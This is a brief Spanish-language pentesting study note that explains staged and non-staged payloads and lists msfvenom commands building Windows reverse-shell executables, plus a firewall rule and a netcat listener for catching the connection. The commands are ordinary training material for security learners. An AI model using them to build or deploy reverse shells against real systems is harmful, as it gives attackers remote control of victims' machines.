# Payload

tipos de payload

* Staged:
  * Mandan el payload por etapas, en diferentes fases
  * El tamaño del payload es mas pequeño por lo que es menos detectable
  * Pueden ser personalizados con metasploit
* Nonstaged:
  * Mandan los payload
  * Es más rapido de enviar porque no requiere varias etapas

con msfvenom podemos crear estos payloads:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=<tuip> LPORT=4646 -f exe -o reverse.exe
```

para arrancar metasploit msfconsole o msfdb run si es la primera vez que lo ejecutas

si no te deja ejecutar el comando con metasploit ufw allow 4646/tcp en el caso de crear un exploit en metasploit y ponerte en escucha por el puerto 4646

En el caso de un exploit ==nonstaged==:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=<tuip> LPORT=4646 -f exe -o reverse.exe
```

en el caso de que quieras hacerlo por netcat y no por metasploit

```
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=<tuip> LPORT=4646 -f exe -o reverse.exe
```

si al ponerte en escucha por netcat y la añades esta herramienta al principio, ganarás una consola más interactiva

```
rlwap nc -lvnp 4646
```

\==payload all the things en github==
